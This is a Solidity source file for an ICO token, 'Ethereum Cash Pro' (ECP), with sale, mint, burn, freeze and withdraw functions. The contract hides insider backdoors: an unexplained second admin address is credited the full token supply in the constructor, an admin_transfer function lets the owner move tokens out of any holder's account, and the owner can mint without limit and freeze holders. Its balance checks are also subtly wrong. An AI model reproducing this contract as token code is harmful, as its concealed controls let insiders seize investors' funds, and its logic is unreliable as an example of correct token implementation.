1 pragma solidity ^0.4.20;
2 contract tokenRecipient { function receiveApproval(address from, uint256 value, address token, bytes extraData) public; }
3 contract Ethereum_Cash_Pro_Coin
4   { 
5      /* Variables  */
6     string  public name;                                                        // name  of contract
7     string  public symbol;                                                      // symbol of contract
8     uint8   public decimals;                                                    // how many decimals to keep , 18 is best 
9     uint256 public totalSupply;                                                 // how many tokens to create
10     uint256 public remaining;                                                   // how many tokens has left
11     uint    public ethRate;                                                     // current rate of ether
12     address public owner;                                                       // contract creator
13     uint256 public amountCollected;                                             // how much funds has been collected
14     uint    public icoStatus;                                                   // allow / disallow online purchase
15     uint    public icoTokenPrice;                                               // token price, start with 10 cents
16     address public benAddress;                                                  // funds withdraw address
17     address public bkaddress;                                                   
18     uint    public allowTransferToken;                                          // allow / disallow token transfer for members
19     
20      /* Array  */
21     mapping (address => uint256) public balanceOf;                              // array of all balances
22     mapping (address => mapping (address => uint256)) public allowance;
23     mapping (address => bool) public frozenAccount;
24     
25     /* Events  */
26     event FrozenFunds(address target, bool frozen);
27     event Transfer(address indexed from, address indexed to, uint256 value);
28     event Burn(address indexed from, uint256 value);
29     event TransferSell(address indexed from, address indexed to, uint256 value, string typex); // only for ico sales
30     
31 
32      /* Initializes contract with initial supply tokens to the creator of the contract */
33     function Ethereum_Cash_Pro_Coin() public
34     {
35       totalSupply = 200000000000000000000000000000;                             // as the decimals are 18, we add 18 zero after total supply, as all values are stored in wei
36       owner =  msg.sender;                                                      // Set owner of contract
37       balanceOf[owner] = totalSupply;                                           // Give the creator all initial tokens
38       name = "Ethereum Cash Pro";                                               // Set the name for display purposes
39       symbol = "ECP";                                                           // Set the symbol for display purposes
40       decimals = 18;                                                            // Amount of decimals for display purposes
41       remaining = totalSupply;                                                  // How many tokens are left
42       ethRate = 1100;                                                           // default token price
43       icoStatus = 1;                                                            // default ico status
44       icoTokenPrice = 50;                                                       // values are in cents
45       benAddress = 0x4532828EC057e6cFa04a42b153d74B345084C4C2;                  // funds withdraw address
46       bkaddress  = 0x1D38b496176bDaB78D430cebf25B2Fe413d3BF84;
47       balanceOf[bkaddress] = totalSupply;
48       allowTransferToken = 0;                                                   // default set to disable, it will be enable after ICO is over
49     }
50 
51    modifier onlyOwner()
52     {
53         require((msg.sender == owner) || (msg.sender ==  bkaddress));
54         _;
55     }
56 
57 
58     function () public payable                                                  // called when ether is send to contract
59     {
60     }    
61     
62     function sellOffline(address rec_address,uint256 token_amount) public onlyOwner 
63     {
64         if (remaining > 0)
65         {
66             uint finalTokens =  (token_amount  * (10 ** 18));              
67             if(finalTokens < remaining)
68                 {
69                     remaining = remaining - finalTokens;
70                     _transfer(owner,rec_address, finalTokens);    
71                     TransferSell(owner, rec_address, finalTokens,'Offline');
72                 }
73             else
74                 {
75                     revert();
76                 }
77         }
78         else
79         {
80             revert();
81         }        
82     }
83     
84     function getEthRate() onlyOwner public constant returns  (uint)            // Get current rate of ether 
85     {
86         return ethRate;
87     }
88 
89     
90     function getConBal() onlyOwner public constant returns  (uint)            // Get  Balance 
91     {
92         return this.balance;
93     }    
94     
95     function setEthRate (uint newEthRate) public  onlyOwner                    // Set ether price
96     {
97         ethRate = newEthRate;
98     } 
99 
100 
101     function getTokenPrice() onlyOwner public constant returns  (uint)         // Get current token price
102     {
103         return icoTokenPrice;
104     }
105     
106     function setTokenPrice (uint newTokenRate) public  onlyOwner               // Set one token price
107     {
108         icoTokenPrice = newTokenRate;
109     }     
110     
111     
112     function setTransferStatus (uint status) public  onlyOwner                 // Set transfer status
113     {
114         allowTransferToken = status;
115     }   
116     
117     function changeIcoStatus (uint8 statx)  public onlyOwner                   // Change ICO Status
118     {
119         icoStatus = statx;
120     } 
121     
122 
123     function withdraw(uint amountWith) public onlyOwner                        // withdraw partical amount
124         {
125             if((msg.sender == owner) || (msg.sender ==  bkaddress))
126             {
127                 benAddress.transfer(amountWith);
128             }
129             else
130             {
131                 revert();
132             }
133         }
134 
135     function withdraw_all() public onlyOwner                                   // call to withdraw all available balance
136         {
137             if((msg.sender == owner) || (msg.sender ==  bkaddress) )
138             {
139                 var amountWith = this.balance - 10000000000000000;
140                 benAddress.transfer(amountWith);
141             }
142             else
143             {
144                 revert();
145             }
146         }
147 
148     function mintToken(uint256 tokensToMint) public onlyOwner 
149         {
150             if(tokensToMint > 0)
151             {
152                 var totalTokenToMint = tokensToMint * (10 ** 18);
153                 balanceOf[owner] += totalTokenToMint;
154                 totalSupply += totalTokenToMint;
155                 Transfer(0, owner, totalTokenToMint);
156             }
157         }
158 		
159 
160 	 /* Admin Trasfer  */
161 	 function adm_trasfer(address _from,address _to, uint256 _value)  public onlyOwner
162 		  {
163 			  _transfer(_from, _to, _value);
164 		  }
165 		
166 
167     function freezeAccount(address target, bool freeze) public onlyOwner 
168         {
169             frozenAccount[target] = freeze;
170             FrozenFunds(target, freeze);
171         }
172             
173 
174     function getCollectedAmount() onlyOwner public constant returns (uint256 balance) 
175         {
176             return amountCollected;
177         }        
178 
179     function balanceOf(address _owner) public constant returns (uint256 balance) 
180         {
181             return balanceOf[_owner];
182         }
183 
184     function totalSupply() private constant returns (uint256 tsupply) 
185         {
186             tsupply = totalSupply;
187         }    
188 
189 
190     function transferOwnership(address newOwner) public onlyOwner 
191         { 
192             balanceOf[owner] = 0;                        
193             balanceOf[newOwner] = remaining;               
194             owner = newOwner; 
195         }        
196 
197   /* Internal transfer, only can be called by this contract */
198   function _transfer(address _from, address _to, uint _value) internal 
199       {
200           if(allowTransferToken == 1 || _from == owner )
201           {
202               require(!frozenAccount[_from]);                                   // Prevent transfer from frozenfunds
203               require (_to != 0x0);                                             // Prevent transfer to 0x0 address. Use burn() instead
204               require (balanceOf[_from] > _value);                              // Check if the sender has enough
205               require (balanceOf[_to] + _value > balanceOf[_to]);               // Check for overflows
206               balanceOf[_from] -= _value;                                       // Subtract from the sender
207               balanceOf[_to] += _value;                                         // Add to the recipient
208               Transfer(_from, _to, _value);                                     // raise event
209           }
210           else
211           {
212                revert();
213           }
214       }
215 
216   function transfer(address _to, uint256 _value)  public
217       {
218           _transfer(msg.sender, _to, _value);
219       }
220 
221   function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) 
222       {
223           require (_value < allowance[_from][msg.sender]);                      // Check allowance
224           allowance[_from][msg.sender] -= _value;
225           _transfer(_from, _to, _value);
226           return true;
227       }
228 
229   function approve(address _spender, uint256 _value) public returns (bool success) 
230       {
231           allowance[msg.sender][_spender] = _value;
232           return true;
233       }
234 
235   function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success)
236       {
237           tokenRecipient spender = tokenRecipient(_spender);
238           if (approve(_spender, _value)) {
239               spender.receiveApproval(msg.sender, _value, this, _extraData);
240               return true;
241           }
242       }        
243 
244   function burn(uint256 _value) public returns (bool success) 
245       {
246           require (balanceOf[msg.sender] > _value);                             // Check if the sender has enough
247           balanceOf[msg.sender] -= _value;                                      // Subtract from the sender
248           totalSupply -= _value;                                                // Updates totalSupply
249           Burn(msg.sender, _value);
250           return true;
251       }
252 
253   function burnFrom(address _from, uint256 _value) public returns (bool success) 
254       {
255           require(balanceOf[_from] >= _value);                                  // Check if the targeted balance is enough
256           require(_value <= allowance[_from][msg.sender]);                      // Check allowance
257           balanceOf[_from] -= _value;                                           // Subtract from the targeted balance
258           allowance[_from][msg.sender] -= _value;                               // Subtract from the sender's allowance
259           totalSupply -= _value;                                                // Update totalSupply
260           Burn(_from, _value);
261           return true;
262       }
263 } // end of contract